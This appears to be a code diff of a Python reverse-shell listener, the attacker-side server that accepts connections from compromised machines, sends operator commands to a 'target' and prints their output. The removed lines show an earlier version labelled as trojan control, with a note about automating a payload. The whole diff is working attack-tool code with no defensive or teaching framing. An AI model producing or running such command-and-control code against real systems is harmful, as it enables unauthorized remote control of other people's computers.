@@ -1,26 +1,39 @@
+import sys
 import socket
 
+#https://axju.de/posts/2021/02/a-reverse-shell-with-python/
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '127.0.0.1' #loopback, will be the server's ip
-port = 1234 #port we're tunneling data into 
+host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' #server IP
+port = int(sys.argv[2] if len (sys.argv) > 2 else 5555) # port we're tunneling data into
 
-#bind server
-server.bind((host,port))
+#create a socket object, waits for incoming connection
+server = socket.socket()
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+server.bind((host, port)) #bind to server address
 server.listen(5)
 
-run = True
-client, addr = server.accept()
-print('Connection opened: ', addr) 
+#loop used as a shell
+while True:
+	print('Listening on', host, ':', port)
+	client = server.accept() #accept the successful connection
+	print(f'[*] Connection opened {client[1]}')
+	client[0].send('Reverse shell connection.'.encode())
+	while True:
+		cmd = input('ghost~$ ')
+		client[0].send(cmd.encode()) #send command to target
 
-while run:
-	try:
-		data = input('>>>')
-		client.send('Trojan Infected.'.encode('UTF-8')) #Send to client
-		msg = client.recv(1024) #receive from client 
-		print(msg.decode('UTF-8'))
-	except ConnectionResetError:
-		print('Client lost. Retrying...')
-		client, addr = server.accept()
-		print('Connection opened: ', addr)
-#!!!!write a script to automate payload
+		#allow user to quit
+		quit = ['q', 'quit', 'x', 'exit']
+		if cmd.lower() in quit:
+			break
+
+		#get the result of the command from the client 
+		result = client[0].recv(1024).decode()
+		print(result)
+
+	client[0].close()
+	cmd = input('Wait for a new connection? y/n: ') or 'y'
+	if cmd.lower() in ['n', 'no']:
+		break
+
+server.close()
